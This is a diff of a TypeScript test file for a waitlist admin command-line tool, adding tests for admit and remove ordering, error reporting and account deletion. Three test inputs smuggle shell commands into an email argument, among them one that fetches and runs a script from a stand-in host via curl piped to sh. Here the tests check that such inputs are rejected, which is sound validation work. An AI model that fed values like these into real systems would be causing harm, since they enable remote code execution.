@@ -43,6 +43,10 @@ function repo(initial: WaitlistEntry[] = [entry()], over: Partial<WaitlistRepo> 
     sendLink: async (email) => {
       log.push(`link ${email}`);
     },
+    accountOf: async () => null,
+    deleteUser: async (id) => {
+      log.push(`delete user ${id}`);
+    },
     ...over,
   };
   return { r, rows, log };
@@ -68,6 +72,10 @@ describe("planCommand", () => {
     [["admit", "a@example.com", "--by", "A"], /--target/],
     [["admit", "--by", "A", "--target", REF], /email/],
     [["admit", "not-an-email", "--by", "A", "--target", REF], /not-an-email/],
+    [["admit", "$(curl${IFS}evil.sh|sh)@x.co", "--by", "A", "--target", REF], /not an email/],
+    [["admit", "a;rm@x.co", "--by", "A", "--target", REF], /not an email/],
+    [["remove", "`id`@x.co", "--by", "A", "--target", REF], /not an email/],
+    [["admit", "a@example.com", "--by", "A", "--target", REF, "--name", "x".repeat(121), "--org", "AE"], /120/],
     [["remove", "a@example.com", "--by", "A"], /--target/],
     [["admit", "a@example.com", "--by", "A", "--target", REF, "--bogus"], /--bogus/],
     [["admit", "a@example.com", "b@example.com", "--by", "A", "--target", REF, "--name", "Ada"], /one person/],
@@ -118,10 +126,10 @@ describe("admit", () => {
     expect(log).toEqual([]);
   });
 
-  it("admits first, then makes the sign-in, sends the link and records it", async () => {
+  it("makes the sign-in safe first, then admits, sends the link and records it", async () => {
     const { r, rows, log } = repo();
     const out = await runCommand(admit(), r, opts);
-    expect(log).toEqual(["admit ada@example.com", "user ada@example.com", "link ada@example.com", "notified ada@example.com"]);
+    expect(log).toEqual(["user ada@example.com", "admit ada@example.com", "link ada@example.com", "notified ada@example.com"]);
     expect(rows.get("ada@example.com")).toMatchObject({ admitted_at: NOW.toISOString(), admitted_by: "Aarnav", notified_at: NOW.toISOString() });
     expect(out.failed).toBe(false);
     expect(out.text).toContain("Ada Lovelace");
@@ -135,6 +143,33 @@ describe("admit", () => {
     expect(rows.get("ada@example.com")).toMatchObject({ admitted_by: "Aarnav", notified_at: null });
   });
 
+  it("doesn't admit someone whose sign-in can't be made safe, and doesn't send them to /login", async () => {
+    const { r, rows, log } = repo([entry()], { ensureUser: async () => { throw new Error("auth down"); } });
+    const out = await runCommand(admit(), r, opts);
+    expect(out.failed).toBe(true);
+    expect(out.text).toContain("auth down");
+    expect(out.text).toContain("not admitted");
+    expect(out.text).not.toContain("/login");
+    expect(rows.get("ada@example.com")?.admitted_at).toBeNull();
+    expect(log).toEqual([]);
+  });
+
+  it("says plainly when the email went out but couldn't be recorded", async () => {
+    const { r } = repo([entry()], { markNotified: async () => { throw new Error("db down"); } });
+    const out = await runCommand(admit(), r, opts);
+    expect(out.failed).toBe(true);
+    expect(out.text).toContain("email sent");
+    expect(out.text).not.toContain("email failed");
+  });
+
+  it("a database error on one person is reported, and the rest still run", async () => {
+    const { r, log } = repo([entry(), entry({ email: "b@example.com" })], { find: async (e) => { if (e === "ada@example.com") throw new Error("db hiccup"); return entry({ email: e }); }, markAdmitted: async () => undefined, markNotified: async () => undefined });
+    const out = await runCommand(admit({ emails: ["ada@example.com", "b@example.com"] }), r, opts);
+    expect(out.failed).toBe(true);
+    expect(out.text).toContain("ada@example.com: db hiccup");
+    expect(log).toContain("link b@example.com");
+  });
+
   it("a rerun retries only the people not yet notified, and keeps who admitted them", async () => {
     const { r, rows, log } = repo([
       entry({ admitted_at: "2026-11-04T00:00:00.000Z", admitted_by: "Yash" }),
@@ -145,10 +180,10 @@ describe("admit", () => {
     expect(rows.get("ada@example.com")?.admitted_by).toBe("Yash");
   });
 
-  it("--no-email admits and sends nothing", async () => {
+  it("--no-email sends nothing, but still makes the sign-in safe", async () => {
     const { r, log } = repo();
     await runCommand(admit({ noEmail: true }), r, opts);
-    expect(log).toEqual(["admit ada@example.com"]);
+    expect(log).toEqual(["user ada@example.com", "admit ada@example.com"]);
   });
 
   it("never emails a synthetic password-account address", async () => {
@@ -194,6 +229,22 @@ describe("remove", () => {
     const { r, rows } = repo();
     await runCommand({ kind: "remove", email: "ada@example.com", by: "A", target: REF }, r, opts);
     expect(rows.size).toBe(0);
+  });
+
+  it("removes the sign-in too, when it has no workspace", async () => {
+    const { r, log } = repo([entry()], { accountOf: async () => ({ id: "u1", member: false }) });
+    const out = await runCommand({ kind: "remove", email: "ada@example.com", by: "A", target: REF }, r, opts);
+    expect(out.failed).toBe(false);
+    expect(log).toEqual(["remove ada@example.com", "delete user u1"]);
+  });
+
+  it("refuses to touch someone with a workspace, who deletes their own account", async () => {
+    const { r, rows, log } = repo([entry()], { accountOf: async () => ({ id: "u1", member: true }) });
+    const out = await runCommand({ kind: "remove", email: "ada@example.com", by: "A", target: REF }, r, opts);
+    expect(out.failed).toBe(true);
+    expect(out.text).toContain("/account");
+    expect(rows.size).toBe(1);
+    expect(log).toEqual([]);
   });
 
   it("says so when there is nothing to remove", async () => {
